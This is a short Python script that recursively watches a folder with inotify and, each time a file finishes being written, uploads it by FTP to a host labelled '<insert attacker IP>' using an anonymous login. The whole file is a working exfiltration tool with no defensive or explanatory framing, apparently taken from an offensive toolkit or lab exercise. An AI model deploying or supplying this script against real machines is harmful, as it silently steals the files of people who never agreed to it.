#!/usr/bin/env python3

# imports
import inotify.adapters
from multiprocessing import Process, Manager
from ftplib import FTP
import os
import sys

def listener(folder):
    i = inotify.adapters.InotifyTree(folder)
    for event in i.event_gen(yield_nones = False):
        (_,status,path,filename) = event
        if "IN_CLOSE_WRITE" in status:
            final_path = path+'/'+filename
            p = Process(target=send_file,args=(final_path,))
            p.start()
def send_file(path):
    ftp = FTP()
    ftp.connect('<insert attacker IP>', 2121)
    ftp.login('anonymous','password')
    #ftp.cwd('/sambashare') # ftp root
    fp = open(path, 'rb')
    ftp.storbinary('STOR %s' % os.path.basename(path), fp, 1024)
    fp.close()
def main():
    p = Process(target=listener,args=(sys.argv[1],))
    p.start()


if __name__ == "__main__":
    main()
